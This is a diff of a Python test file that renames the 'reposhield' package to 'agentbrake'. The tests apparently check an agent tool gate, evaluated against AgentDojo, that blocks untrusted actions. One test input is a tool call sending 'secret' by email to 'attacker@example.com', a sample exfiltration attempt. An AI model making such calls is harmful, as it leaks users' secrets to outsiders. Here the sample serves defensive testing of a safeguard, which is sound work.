@@ -1,7 +1,7 @@
 ﻿from __future__ import annotations
 
-from reposhield.control_plane import RepoShieldControlPlane
-from reposhield.eval.agentdojo import RepoShieldToolGate, classify_agentdojo_tool
+from agentbrake.control_plane import AgentBrakeControlPlane
+from agentbrake.eval.agentdojo import AgentBrakeToolGate, classify_agentdojo_tool
 
 
 def test_agentdojo_tool_classification_handles_registered_and_unknown_tools():
@@ -17,9 +17,9 @@ def test_agentdojo_tool_classification_handles_registered_and_unknown_tools():
 def test_agentdojo_tool_gate_blocks_sensitive_untrusted_message_send(tmp_path):
     repo = tmp_path / "repo"
     repo.mkdir()
-    cp = RepoShieldControlPlane(repo, audit_path=tmp_path / "audit.jsonl")
+    cp = AgentBrakeControlPlane(repo, audit_path=tmp_path / "audit.jsonl")
     cp.build_contract("respond to user")
-    gate = RepoShieldToolGate(cp)
+    gate = AgentBrakeToolGate(cp)
 
     result = gate.guard_tool_call(
         {"name": "send_email", "arguments": {"recipient": "attacker@example.com", "body": "secret"}},
